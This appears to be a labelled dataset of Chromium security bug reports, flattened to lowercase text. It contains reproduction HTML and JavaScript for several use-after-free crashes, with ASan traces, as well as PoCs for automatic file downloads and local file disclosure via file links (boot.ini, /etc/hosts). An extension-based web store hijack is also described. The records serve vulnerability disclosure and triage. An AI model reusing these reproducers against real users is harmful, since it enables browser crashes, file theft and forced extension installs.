security autofill info can be captured by innocuous social engineering vulnerability details a web page can be crafted that captures a user s autofill details when they press down down enter with nothing shown on screen for me at least pressing dde could easily be socially engineered as part of a game especially if there s some way of detecting when a user presses a key in the cycle version chrome version 18.0.1025.152 stable operating system windows 7 sp1 reproduction case it s attached your address should appear when you follow the instructions if you have it saved	11
heap-use-after-free in webcore graphicscontext restore vulnerability details use-after-free in webcore graphicscontext restore version chrome version dev chromium 20.0.1108.0 developer build 132776 os linux webkit 536.8 114483 operating system 64bit precise reproduction case html head script onload function el6.setattributens xlink href el0 script head body svg id el0 filter url el2 filter id el2 feimage id el6 feimage filter svg body html for crashes please include the following additional information type of crash renderer asan crash state 22792 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 1 at thread t0 0 in webcore graphicscontext restore 0 1 in webcore rendersvgroot paintreplaced webcore paintinfo webcore intpoint const 0 2 in webcore renderreplaced paint is located 108 bytes inside of 144-byte region freed by thread t0 here 0 in free 0 1 in webcore imagebuffer imagebuffer 0 2 in webcore filtereffect filtereffect 0 3 in webcore feimage feimage 0 4 in webcore svgfilterbuilder svgfilterbuilder	11
heap-use-after-free in webcore rendersvgcontainer paint vulnerability details use-after-free in webcore rendersvgcontainer paint version chrome version stable dev chromium 20.0.1121.0 developer build 134273 os linux webkit 536.10 115413 operating system 64bit precise reproduction case yes it has counters html head style el1 border-left-style double el3 content counter c style script onload function el0=document.createelementns svg el0.setattribute marker-mid url el4 document.body.appendchild el0 el1=document.createelementns svg el1.setattribute id el1 document.body.appendchild el1 el2=document.createelementns path el2.setattribute d m 0 0 s 0 0 0 0 c 0 0 0 0 0 400 c 0 0 0 400 400 0 el0.appendchild el2 el3=document.createelementns svg el3.setattribute id el3 el1.appendchild el3 el4=document.createelementns marker el4.setattribute id el4 el3.appendchild el4 scrollto 0 60 document.body.style.zoom=0.1 document.designmode='on document.execcommand selectall document.designmode='off settimeout location.reload 100 script head body body html for crashes please include the following additional information type of crash tab asan crash state 12506 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore rendersvgcontainer paint webcore paintinfo webcore intpoint const 0 1 in webcore rendersvgresourcemarker draw webcore paintinfo webcore affinetransform const 0 2 in webcore svgmarkerlayoutinfo drawmarkers webcore paintinfo 0 is located 0 bytes inside of 240-byte region freed by thread t0 here 0 in free 0 1 in webcore node detach 0 2 in webcore element detach 0 3 in webcore containernode detach 0	11
security arbitrary memory read in libxslt vulnerability details when parsing a xslt stylesheet containing a dtd a structure of type xmlentity is accessed as another type the value of cur ns href is then compared with a string given that this value is controlled by the attacker it can access arbitrary memory locations version chrome 18.0.1025.162 chromium 18.0.1025.151 build de developpement 130497 linux ubuntu 10.04 xsltproc version using libxml 20706 libxslt 10126 and libexslt 815 xsltproc was compiled against libxml 20706 libxslt 10126 and libexslt 815 libxslt 10126 was compiled against libxml 20706 libexslt 815 was compiled against libxml 20706 backtrace 0 xmlstrequal__internal_alias str1 address out of bounds str2 at xmlstring.c:162 1 in xsltparsetemplatecontent style templ at xslt.c:4849 2 in xsltparsestylesheetprocess ret doc at xslt.c:6456 3 in xsltparsestylesheetimporteddoc doc parentstyle at xslt.c:6627 4 in xsltparsestylesheetdoc doc at xslt.c:6666 5 in main argc=4 argv at xsltproc.c:830 reproduction case when magic.xml is opened in a browser it will load magic.xsl trigger the bug and crash the current tab poc code doctype whatever attlist magic blabla cdata anything entity foobar abcd_efg kl_mnop_qrst_uvwx_yzab_cdef_ghik_klmn_opqr_stuv_wxyz magic xsl version 1.0 xmlns xsl analysis once the xsl document is parsed we get the following layout xml_document_node type xmldoc name magic.xsl children v next xml_dtd_node xml_element_node type xmldtd type xmlnode name whatever name magic children v next xml_attribute_decl xml_entity_decl type xmlattribute type xmlentity name blabla name foobar function xsltparsetemplatecontent at libxslt-1.1.26/libxslt/xslt.c:4830 4837 cur templ children cur points to a xml_dtd_node structure 4839 while cur null 1st time we enter the while loop 4849 if is_xslt_elem cur neither the if or else if branchs are taken 4966 if cur children null 4967 if cur children type xml_entity_decl 4968 cur cur children 4969 continue 4970 4971 cur now points to a xml_attribute_decl structure 4839 while cur null 2nd time we enter the while loop 4849 if is_xslt_elem cur neither the if or else if branchs are taken 4966 if cur children null cur has no child 4973 if cur next null 4974 cur cur next 4975 continue 4976 cur now points to a xml_entity_decl structure 4839 while cur null 3rd time we enter the while loop 4849 if is_xslt_elem cur cur is of type xmlentity which has n't a ns entry cur ns href points inside the entity value from libxslt-1.1.26/libxslt/xsltutils.h 54 define is_xslt_elem n 55 n null n ns null 56 xmlstrequal n ns href xslt_namespace crash in xmlstrequal while dereferencing n ns href patch it could be enough to test near line 4974 if cur next type xml_entity_decl this was n't tested	9
heap-buffer-overflow in gpu gles2 gles2implementation texsubimage2dimpl detailed report fuzzer inferno_twister crash type heap-buffer-overflow read 1 crash address crash state crash stack gpu gles2 gles2implementation texsubimage2dimpl gpu gles2 gles2implementation texsubimage2d webcore webglrenderingcontext texsubimage2dimpl regressed minimized testcase 0.48 kb download script src=resources/webgl-test.js script script src=resources/webgl-test-utils.js script canvas id=c width='1639 script var wtu webgltestutils var canvas document.getelementbyid testbed var gl wtu.create3dcontext canvas var tex gl.createtexture gl.bindtexture gl.texture_2d tex gl.teximage2d gl.texture_2d 0 gl.rgba gl.rgba gl.unsigned_short_4_4_4_4 c gl.texsubimage2d gl.texture_2d 0 0,0 gl.rgba gl.unsigned_short_4_4_4_4 c script	11
chrome_mac zombie downloaditemcontroller received handlereveal via performselector withobject product chrome_mac stack signature anonymous namespace zombieobjectcrash-5f6508 new signature label anonymous namespace zombieobjectcrash new signature hash ed37f031_4af25130_2aa2945d_8e1b6bea_63c38dfd report link meta information product name chrome_mac product version 20.0.1132.17 report id 58df4fa6b1b0d24b report time 2012/05/25 06:18:24 fri uptime 60 sec cumulative uptime 0 sec os name mac os x os version 10.6.8 10k549 cpu architecture x86 cpu info genuineintel family 6 model 30 stepping 5 ptype browser zombie_dealloc_bt sendaction nsmenuitem tag 0 sending handlereveal to	11
heap-use-after-free in webcore renderobject setstyle vulnerability details use-after-free in webcore renderobject setstyle version chrome version stable dev chromium 21.0.1154.0 developer build 139215 os linux webkit 537.1 118560 operating system 64bit preceise reproduction case html head style el0 webkit-columns 1 el2 first-of-type el2 first-letter content counter c el3 webkit-column-span all content counter c attr a style script onload function el0=document.createelement div el0.setattribute id el0 document.body.appendchild el0 el1=document.createelement b el0.appendchild el1 el1.appendchild document.createtextnode a el2=document.createelement div el2.setattribute id el2 el0.appendchild el2 el3=document.createelement div el3.setattribute id el3 el2.appendchild el3 document.designmode='on document.execcommand selectall el2.appendchild document.createtextnode aa document.designmode='on document.execcommand selectall document.execcommand removeformat script head body body html for crashes please include the following additional information type of crash asan tab crash state 9160 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore renderobject setstyle wtf passrefptr webcore renderstyle 0 1 in webcore text recalctextstyle webcore node stylechange 0 2 in webcore element recalcstyle webcore node stylechange 0 3 in webcore element recalcstyle webcore node stylechange 0 is located 24 bytes inside of 120-byte region freed by thread t0 here 0 in free 0 1 in webcore renderblock createfirstletterrenderer webcore renderobject webcore renderobject 0 2 in webcore renderblock updatefirstletter 0 3 in webcore renderobject setstyle wtf passrefptr webcore renderstyle 0 4 in webcore text recalctextstyle webcore node stylechange 0	11
unknown in v8 function call vulnerability details as per bug redefining setter on typed array to a number then calling the constructor for that typed array with a function as an argument results in good|bad stuff int32array.prototype.set new int32array function if the first argument is an array a different branch is taken the value of set goes into the high bits of the faulty address version chrome version stable dev chromium 21.0.1154.0 developer build 139215 os linux webkit 537.1 118560 javascript v8 3.11.6.2 operating system 64bit precise reproduction case html head script var arrays float32array float64array int8array int16array int32array uint8array uint8clampedarray uint16array uint32array var some=arrays math.floor math.random arrays.length window some prototype.set new window some 0 function script head body body html for crashes please include the following additional information type of crash tab crash state 24558 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting 0 in v8 function call v8 handle v8 object int v8 handle v8 value 0 1 in webcore copyelements v8 handle v8 object v8 handle v8 object unsigned int 0 2 in v8 handle v8 value webcore constructwebglarray wtf int8array signed char v8 arguments const webcore wrappertypeinfo v8 externalarraytype 0 3 in v8 internal builtin_handleapicallconstruct v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate v8/src/builtins.cc:0	11
heap-use-after-free in webcore svgdocumentextensions removeallelementreferencesfortarget vulnerability details use-after-free in webcore svgdocumentextensions removeallelementreferencesfortarget version chrome version dev chromium 21.0.1157.0 developer build 139531 os linux webkit 537.1 118843 operating system 64bit precise reproduction case html head style style script onload function el0=document.createelementns svg el0.setattribute id el0 document.body.appendchild el0 document.body.appendchild document.createtextnode a el1=document.createelementns svg el1.setattribute id el1 el1.appendchild document.createtextnode a document.body.appendchild el1 document.body.appendchild document.createtextnode a el2=document.createelementns image el2.setattribute id el2 el0.appendchild el2 el3=document.createelementns textpath el3.setattributens xlink href el1 el2.appendchild el3 el4=document.createelementns use el4.setattributens xlink href el2 el0.appendchild el4 el2.setattributens xlink href el0 document.designmode='on window.getselection setbaseandextent el1 0 el1 0 document.execcommand forwarddelete settimeout location.reload 10 script head body body html for crashes please include the following additional information type of crash tab asan crash state 9219 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore svgdocumentextensions removeallelementreferencesfortarget webcore svgelement 0 1 in webcore svgelement removedfrom webcore containernode 0 2 in webcore svgstyledelement removedfrom webcore containernode 0 is located 0 bytes inside of 392-byte region freed by thread t0 here 0 in operator delete void 0 1 in webcore svgelementinstance detach 0 2 in webcore svgelementinstance svgelementinstance 0 3 in webcore svgelementinstance svgelementinstance 0	11
security webm heap-buffer-overflow in matroskadec.c matroska_parse_block here is some code from matroskadec.c matroska_parse_block int offset 0 pkt_size lace_size n if pkt_size size av_log matroska ctx av_log_error invalid packet size\n break if av_new_packet pkt pkt_size+offset 0 memcpy pkt data+offset pkt_data pkt_size the problem is that lace_size n is attacker controlled also the pkt_size size comparision is signed the attacker can create a situation where lace_size 0 pkt_size=-1 and offset=2 then av_new_packet will malloc 1-byte buffer 1 2 and 4gb is copied there with memcpy 1 version chrome version 18.0.969.0 developer build 113953 operating system ubuntu 10.04 i686 ubuntu 12.04 x86_64 windows 7 x86_64 reproduction case open bad.webm in chrome for crashes please include the following additional information type of crash tab program received signal sigsegv segmentation fault switching to thread lwp 3168 memcpy_ssse3 at sysdeps/i386/i686/multiarch/memcpy-ssse3.s:1282 1282 sysdeps/i386/i686/multiarch/memcpy-ssse3.s no such file or directory in sysdeps/i386/i686/multiarch/memcpy-ssse3.s gdb x/10i eip memcpy_ssse3+3410 movdqu eax xmm5 memcpy_ssse3+3415 movdqu eax xmm6 memcpy_ssse3+3420 movdqu eax xmm7 memcpy_ssse3+3425 lea eax eax memcpy_ssse3+3431 sub ecx memcpy_ssse3+3437 movntdq xmm0 edx memcpy_ssse3+3441 movntdq xmm1 edx memcpy_ssse3+3446 movntdq xmm2 edx memcpy_ssse3+3451 movntdq xmm3 edx memcpy_ssse3+3456 movntdq xmm4 edx gdb info reg eax 1196834907 ecx 4575392 edx 1196835520 ebx 1320394764 esp ebp esi 1201949088 edi 1201410784 eip memcpy_ssse3+3410 eflags pf sf if rf cs 115 ss 123 ds 123 es 123 fs 0 gs 51 gdb bt 0 memcpy_ssse3 at sysdeps/i386/i686/multiarch/memcpy-ssse3.s:1282 1 in matroska_parse_block matroska value optimized out data value optimized out size value optimized out pos=104 cluster_time=0 duration=0 is_keyframe=1 cluster_pos=92 at usr/include/bits/string3.h:52 2 in matroska_parse_cluster_incremental s pkt at third_party/ffmpeg/patched-ffmpeg/libavformat/matroskadec.c:2073 3 matroska_read_packet s pkt at third_party/ffmpeg/patched-ffmpeg/libavformat/matroskadec.c:2094 4 in av_read_packet s pkt at third_party/ffmpeg/patched-ffmpeg/libavformat/utils.c:730 5 in av_read_frame_internal s value optimized out pkt value optimized out at third_party/ffmpeg/patched-ffmpeg/libavformat/utils.c:1188 6 in avformat_find_stream_info ic options at third_party/ffmpeg/patched-ffmpeg/libavformat/utils.c:2360 7 in av_find_stream_info ic at third_party/ffmpeg/patched-ffmpeg/libavformat/utils.c:2249 8 in av_find_stream_info ic at out/debug/obj.target/ffmpeg/geni/ffmpeg_stubs.cc:440 9 in media ffmpegdemuxer initializetask media datasource base callback void media pipelinestatus const this type return to continue or q return to quit	11
heap-use-after-free in webcore counternode lastdescendant vulnerability details use-after-free in webcore counternode lastdescendant version chrome version dev stable chromium 21.0.1152.0 developer build 139183 os linux webkit 537.1 118560 javascript v8 3.11.6.2 operating system 64bit precise reproduction case html head style el0 after content counter c counter-increment c el1 content counter c counter-increment c el2 content counter c counter-increment c el2 after content counter c el3 position absolute el3 before content counter c counter-reset c el3 after content counter c counter-reset c el4 counter-increment c el5 content counter c counter-increment c style script onload function el0=document.createelement span el0.setattribute id el0 document.body.appendchild el0 el1=document.createelement div el1.setattribute id el1 el0.appendchild el1 el2=document.createelement div el2.setattribute id el2 el0.appendchild el2 el3=document.createelement div el3.setattribute id el3 el2.appendchild el3 el4=document.createelement span el4.setattribute id el4 el2.appendchild el4 el5=document.createelement div el5.setattribute id el5 el0.appendchild el5 document.body.offsettop document.stylesheets 0 insertrule el2 after counter-increment c document.stylesheets 0 length document.body.offsettop document.stylesheets 0 insertrule xyz document.stylesheets 0 length script head body body html for crashes please include the following additional information type of crash renderer asan crash state 32268 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore counternode lastdescendant const 0 1 in webcore destroycounternodewithoutmapremoval wtf atomicstring const webcore counternode third_party/webkit/source/webcore/rendering/rendercounter.cpp:0 is located 64 bytes inside of 72-byte region freed by thread t0 here 0 in free 0 1 in void wtf deleteownedptr wtf hashmap wtf refptr wtf atomicstringimpl wtf refptr webcore counternode wtf ptrhash wtf refptr wtf atomicstringimpl wtf hashtraits wtf refptr wtf atomicstringimpl wtf hashtraits wtf refptr webcore counternode wtf hashmap wtf refptr wtf atomicstringimpl wtf refptr webcore counternode wtf ptrhash wtf refptr wtf atomicstringimpl wtf hashtraits wtf refptr wtf atomicstringimpl wtf hashtraits wtf refptr webcore counternode 0 2 in webcore rendercounter destroycounternodes webcore renderobject 0 3 in webcore rendercounter rendererremovedfromtree webcore renderobject 0 4 in webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 0	11
heap-use-after-free in webcore renderblock layoutblockchildren vulnerability details use-after-free in webcore renderblock layoutblockchildren version chrome version stable dev chromium 21.0.1159.0 developer build 139782 os linux webkit 537.1 119013 operating system 64bit precise reproduction case html head style el0 height 1px webkit-writing-mode vertical-rl el0 nth-child 3 height auto style script onload function document.body.appendchild document.createelement select document.body.appendchild document.createelement form el0=document.createelement input el0.setattribute id el0 el0.setattribute type range document.body.appendchild el0 document.designmode='on document.execcommand selectall document.execcommand formatblock false pre script head body body html for crashes please include the following additional information type of crash renderer+asan crash state 25800 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in webcore renderblock layoutblockchildren bool webcore fractionallayoutunit 0 1 in webcore renderblock layoutblock bool webcore fractionallayoutunit 0 2 in webcore renderblock layout 0 is located 48 bytes inside of 184-byte region freed by thread t0 here 0 in free 0 1 in webcore node detach 0 2 in webcore element detach 0 3 in webcore containernode detach 0 4 in webcore elementshadow detach 0	11
domui process can be ptraced from a compromised renderer leading to sandbox escape take 2 it turns out that is not fixed anymore we made the check more tight but it was then relaxed unfortunately breakpad trusts si_user i3ucdwkurys/trunk/src/client/linux/handler/exception_handler.cc l=338 i did n't notice at the time the check was relaxed that kill uses si_user not si_tkill and that it would be an issue there are two ways to fix this 1 a new kernel patch to prevent si_user spoofing 2 a breakpad patch where we only trust tkill signals i.e signals sent by either tkill or tgkill since tgkill does n't allow to send a signal to a whole thread group i do n't think that 2 can work i ll look into 1	6
security chrome allows carpet bomb from file download vulnerability details a malicious site ability to download an arbitrary number of files automatically with javascript the attacker controls the name and the content of the file an html link is created with the html5 download attribute set to the file name and the href to any url a javascript mouseevents is used to automate the clicks this will bypass the chrome banner alerting the user that more than one file is being downloaded version chrome version 14.0.835.15 operating system tested on osx xp win7 reproduction case poc unpublished at time of report html body script var dl_link document.createelement a document.body.appendchild dl_link dl_link.setattribute href data hello 2c 20world for i=1 i 5 i var evt document.createevent mouseevents dl_link.setattribute download test_'+i+'.txt evt.initmouseevent click true true window 0 0 0 0 0 false false false false 0 null dl_link.dispatchevent evt script body html	11
dragging a file into a web renderer exposes the file scheme vulnerability details a html a tag is created using a file url the html5 download attribute allowing the attacker to set the name and force the file download this allows the attacker to effectively copy any file the user has access to into the downloads directory and rename it in the poc listed below the victim would then be tricked into dragging the local system file from the chrome download bar back into an html5 drop zone uploading it to the server the current example takes advantage of issue however the is not necessary for the attack version chrome version chrome build 14.0.835.15 operating system osx xp win7 were tested reproduction case poc with dnd local file disclosure unpublished at time of report a href file c boot.ini download test.txt win xp a a href file c windows/system32/drivers/etc/hosts download test.txt win 7 a a href file etc/hosts download test.txt osx a	2
security webrequest api allows extensions to xss chrome.google.com and gain access to webstoreprivate api this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details i noticed a while ago that has access to a special chrome.webstoreprivate api that s probably the reason why this site is protected against extensions injecting content scripts wo n't work and webnavigation api wo n't receive requests for the chrome.google.com host this protection is n't complete however loads scripts from other hosts e.g when it requests these scripts the requests can be intercepted by the webnavigation api and replaced by extension s own scripts these scripts will execute in the context of the web store page in particular they will have access to chrome.webstoreprivate api version chrome version 20.0.1132.27 beta all other versions affected as well operating system windows 7 x64 reproduction case the attached extension unzip and load as unpacked extension in chrome to test demonstrates this approach it replaces by its own xss.js script it then opens web store in a new window window contents are replaced by an unsuspicious message to prevent the user from suspecting anything loading web store into a frame inside background.html is prevented by x-frame-options header the xss.js script then goes on to install google 1 button extension silently granted only a few whitelisted extensions can be installed silently so the extension also demonstrates a possible approach for other extensions it nags the user into installing rss subscription extension chosen randomly any other extension in web store will do as well screenshot of the nag screen is attached if the user declines the installation then the same dialog will simply come up again no way to break out of the loop this is different from chrome.webstore.install you are n't bound to installation on user gesture which allows you to nag the user until he finally accepts also you can determine the displayed information by manipulating the extension name and icon i made this dialog looks like a recommendation coming from chrome itself the web store also has access to the chrome.management api i did n't implement this in my proof of concept but an attacker who got two extensions installed in user s browser can effectively prevent them from ever being uninstalled both extensions use chrome.management api to detect when the other is uninstalled if that happens they use the nagging approach described above to make sure that the extension is reinstalled if an extension is disabled then they can simply re-enable it directly without asking the user if the goal is really to protect then the webrequest api should not receive any requests made by no matter what host these requests point to in other words the exclusion criterion here should be the document url not the request url this will also fix the issue that prompted me to investigate this in the first place adblock plus mistakenly blocked some requests on because it saw these requests without receiving the main_frame request first missing context information caused the wrong action note i ve sent this to security google.com before filing a bug here	6
security memory address disclosure through javascript in webui s cookies page vulnerability details the cookies ui contains two pieces c objects to access the cookie jar and javascript that renders it in webui the issue is that tree nodes are identified using their memory address converted to string and passed to the javascript running in the webui renderer the relevant functions are getchildnodelist oamlx_jo-ck/src/chrome/browser/ui/webui/cookies_tree_model_util.cc exact_package=chromium q=getchildnodelist ct=rc cd=2 sq l=264 gettreenodefrompath oamlx_jo-ck/src/chrome/browser/ui/webui/cookies_tree_model_util.cc exact_package=chromium q=gettreenodefrompath ct=rc cd=1 sq l=276 version chrome version all versions for at least the last 1.25 years operating system any os reproduction case open the cookies ui launch the developer tools set a breakpoint on cookiesview.loadchildren observe the contents of args 1 is an array of objects the id property of each object is the hex version of the address of the object in the browser process modifying the values in js to be invalid does n't crash the browser process as the treenode s getindexof method is doing a lookup of the pointer into a vector of child nodes it is still a disclosure of heap addresses in the browser process to the renderer process	11
heap-use-after-free in webcore styleresolver collectmatchingrulesforlist vulnerability details heap-use-after-free happens when trying to enumerate rules after cssstylesheet rule was deleted version stable 20.0.1132.47 m win7 x64 version 20.0.1091.0 130362 ubuntu 11.10 version 22.0.1192.0 145068 ubuntu 10.10 22.0.1199.0 canary win7 x64 6506 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in wtf refptr webcore stylepropertyset get const 0 1 in webcore styleresolver collectmatchingrulesforlist wtf vector webcore ruledata 0ul const int int webcore styleresolver matchoptions const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/styleresolver.cpp:1091 2 in webcore styleresolver matchauthorrules webcore styleresolver matchresult bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/styleresolver.cpp:993 3 in webcore styleresolver matchallrules webcore styleresolver matchresult bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/styleresolver.cpp:1165 4 in webcore styleresolver styleforelement webcore element webcore renderstyle webcore stylesharingbehavior webcore rulematchingbehavior webcore renderregion media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/styleresolver.cpp:1752 5 in webcore element styleforrenderer media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1033 6 in webcore element recalcstyle webcore node stylechange media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1057 7 in webcore element recalcstyle webcore node stylechange media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1149 8 in webcore element recalcstyle webcore node stylechange media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1149 9 in webcore element recalcstyle webcore node stylechange media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1149 10 in webcore element recalcstyle webcore node stylechange media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1149 11 in webcore document recalcstyle webcore node stylechange media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:1812 12 in webcore document updatestyleifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:1861 13 in webcore frameview updatelayoutandstyleifneededrecursive media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:3168 14 in webcore frameview updatelayoutandstyleifneededrecursive media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:3178 15 in webkit pagewidgetdelegate layout webcore page media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/pagewidgetdelegate.cpp:83 16 in webkit webviewimpl layout media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:1581 17 in renderwidget dodeferredupdate media/chromium/chromium/depot_tools/src/content/renderer/render_widget.cc:855 18 in renderwidget dodeferredupdateandsendinputack media/chromium/chromium/depot_tools/src/content/renderer/render_widget.cc:807 19 in renderwidget onupdaterectack media/chromium/chromium/depot_tools/src/content/renderer/render_widget.cc:452 20 in bool ipc message dispatch renderwidget renderwidget ipc message const renderwidget renderwidget void renderwidget media/chromium/chromium/depot_tools/src/./ipc/ipc_message.h:154 21 in renderwidget onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/renderer/render_widget.cc:229 22 in renderviewimpl onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/renderer/render_view_impl.cc:966 23 in messagerouter routemessage ipc message const media/chromium/chromium/depot_tools/src/content/common/message_router.cc:47 24 in messagerouter onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/message_router.cc:40 25 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:208 26 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:250 27 in base internal invokehelper false void base internal runnableadapter void ipc channelproxy context ipc message const void ipc channelproxy context const ipc message const makeitso base internal runnableadapter void ipc channelproxy context ipc message const ipc channelproxy context const ipc message const media/chromium/chromium/depot_tools/src/./base/bind_internal.h:897 28 in messageloop runtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:456 29 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:467 30 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:643 31 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 32 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:415 33 in base runloop run media/chromium/chromium/depot_tools/src/base/run_loop.cc:46 34 in messageloop run media/chromium/chromium/depot_tools/src/base/message_loop.cc:299 35 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:270 36 in content runzygote content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main_runner.cc:327 37 in content runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main_runner.cc:380 38 in content contentmainrunnerimpl run media/chromium/chromium/depot_tools/src/content/app/content_main_runner.cc:627 39 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:35 40 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 41 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 42 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:258 is located 8 bytes inside of 24-byte region freed by thread t0 here 0 in operator delete void 0 1 in wtf vector wtf refptr webcore stylerulebase 0ul remove unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/wtf/wtf/vector.h:1129 addr2line no such file 2 in webcore cssstylesheet deleterule unsigned int int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssstylesheet.cpp:271 3 in webcore cssstylesheetv8internal deleterulecallback v8 arguments const media/chromium/chromium/depot_tools/src/out/release/obj/gen/webcore/bindings/v8cssstylesheet.cpp:113 4 in v8 internal maybeobject v8 internal handleapicallhelper false v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1145 5 in 6 in 7 in 8 in 9 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 10 in v8 function call v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/v8/src/api.cc:3655 11 in webcore v8proxy instrumentedcallfunction webcore frame v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:441 12 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:390 13 in webcore scheduledaction execute webcore v8proxy media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/scheduledaction.cpp:133 14 in webcore domtimer fired media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/domtimer.cpp:149 15 in webcore threadtimers sharedtimerfiredinternal media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/threadtimers.cpp:118 16 in base internal invokehelper false void base internal runnableadapter void webkit_glue webkitplatformsupportimpl void webkit_glue webkitplatformsupportimpl makeitso base internal runnableadapter void webkit_glue webkitplatformsupportimpl webkit_glue webkitplatformsupportimpl media/chromium/chromium/depot_tools/src/./base/bind_internal.h:869 17 in base internal invoker 1 base internal bindstate base internal runnableadapter void webkit_glue webkitplatformsupportimpl void webkit_glue webkitplatformsupportimpl void base internal unretainedwrapper webkit_glue webkitplatformsupportimpl void webkit_glue webkitplatformsupportimpl run base internal bindstatebase media/chromium/chromium/depot_tools/src/./base/bind_internal.h:1170 18 in base timer runscheduledtask media/chromium/chromium/depot_tools/src/base/timer.cc:184 19 in base internal invokehelper false void base internal runnableadapter void base basetimertaskinternal void base basetimertaskinternal makeitso base internal runnableadapter void base basetimertaskinternal base basetimertaskinternal media/chromium/chromium/depot_tools/src/./base/bind_internal.h:869 20 in base internal invoker 1 base internal bindstate base internal runnableadapter void base basetimertaskinternal void base basetimertaskinternal void base internal ownedwrapper base basetimertaskinternal void base basetimertaskinternal run base internal bindstatebase media/chromium/chromium/depot_tools/src/./base/bind_internal.h:1170 21 in messageloop runtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:456 22 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:467 23 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:643 24 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 25 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:415 26 in base runloop run media/chromium/chromium/depot_tools/src/base/run_loop.cc:46 27 in messageloop run media/chromium/chromium/depot_tools/src/base/message_loop.cc:299 28 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:270 previously allocated by thread t0 here 0 in operator new unsigned long 0 1 in webcore stylerule create int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/stylerule.h:92 2 in webcore cssparser createstylerule wtf vector wtf ownptr webcore cssparserselector 0ul media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssparser.cpp:9475 3 in cssyyparse void media/chromium/chromium/src/third_party/webkit/source/webcore/css/cssgrammar.y:919 4 in webcore cssparser parsesheet webcore stylesheetcontents wtf string const int wtf vector wtf refptr webcore cssrulesourcedata 0ul media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssparser.cpp:330 5 in webcore 